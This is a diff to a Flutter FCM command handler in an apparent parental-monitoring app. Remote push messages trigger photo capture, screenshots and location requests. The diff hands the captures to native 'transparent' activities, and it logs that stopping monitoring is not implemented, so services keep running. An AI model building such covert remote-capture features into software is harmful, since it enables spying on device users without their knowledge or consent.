@@ -2,10 +2,8 @@
 import 'package:firebase_messaging/firebase_messaging.dart';
 import 'package:get/get.dart';
 import 'dart:developer' as developer;
-import '../background/screen_capture_service.dart';
 import '../local/local_storage_service.dart';
 import '../api/device_service.dart';
-import '../background/camera_service.dart';
 import '../background/location_service.dart';
 
 /// Background message handler (must be top-level function)
@@ -15,6 +13,8 @@ Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
   developer.log('📨 Background FCM Message Received', name: 'FCM');
   developer.log('Message ID: ${message.messageId}', name: 'FCM');
   developer.log('Data: ${message.data}', name: 'FCM');
+
+  await LocalStorageService.init();
 
   await FcmHandler.handleCommand(message.data);
 
@@ -144,16 +144,21 @@ class FcmHandler {
     try {
       switch (commandType) {
         case 'CAPTURE_PHOTO':
-          developer.log('📸 Executing: Capture Photo', name: _tag);
-          final useFront = data['front_camera']?.toString() == 'true';
-          await CameraService.captureAndSend(useFrontCamera: useFront);
-          developer.log('✅ Photo capture command sent', name: _tag);
+          // ✅ NATIVE HANDLES THIS - Don't use Flutter CameraService
+          developer.log('📸 Command: Capture Photo', name: _tag);
+          developer.log(
+            '✅ Handled by native FCM service (CameraTransparentActivity)',
+            name: _tag,
+          );
           break;
 
         case 'SCREEN_CAPTURE':
-          developer.log('🖥️ Executing: Capture Screenshot', name: _tag);
-          await ScreenCaptureService.captureAndSend();
-          developer.log('✅ Screenshot capture command sent', name: _tag);
+          // ✅ NATIVE HANDLES THIS - Don't use Flutter ScreenCaptureService
+          developer.log('🖥️ Command: Capture Screenshot', name: _tag);
+          developer.log(
+            '✅ Handled by native FCM service (ScreenCaptureTransparentActivity)',
+            name: _tag,
+          );
           break;
 
         case 'REQUEST_LOCATION':
@@ -164,14 +169,11 @@ class FcmHandler {
 
         case 'START_MONITORING':
           developer.log('▶️ Executing: Start Monitoring', name: _tag);
-          // Background service should already be running
-          // Just log for now
           developer.log('✅ Monitoring already active', name: _tag);
           break;
 
         case 'STOP_MONITORING':
           developer.log('⏹️ Executing: Stop Monitoring', name: _tag);
-          // Optional: Could stop services, but usually parent just stops requesting data
           developer.log(
             '⚠️ Stop monitoring not implemented (services continue)',
             name: _tag,
